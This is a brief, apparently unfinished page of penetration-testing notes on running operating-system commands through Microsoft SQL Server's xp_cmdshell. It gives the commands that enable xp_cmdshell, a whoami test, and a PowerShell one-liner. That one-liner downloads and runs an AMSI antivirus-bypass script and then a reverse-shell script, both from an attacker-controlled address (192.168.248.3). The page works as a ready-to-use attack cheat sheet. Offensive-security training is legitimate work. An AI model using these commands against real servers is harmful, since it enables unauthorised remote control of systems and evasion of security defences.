# Executing Commands

## PAGINA MOET NOG WORDEN UITGEBREID

1. Enable xp\_cmdshell

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![](<../../../.gitbook/assets/image (69).png>)

2\. Execute commands with xp\_cmdshell:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../.gitbook/assets/image (60).png>)

3\. Gain a reverse shell and execute commands

```
EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/amsi.txt''); iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/Invoke-PowerShellTcp2.ps1'')"'
```

![](<../../../.gitbook/assets/image (45).png>)
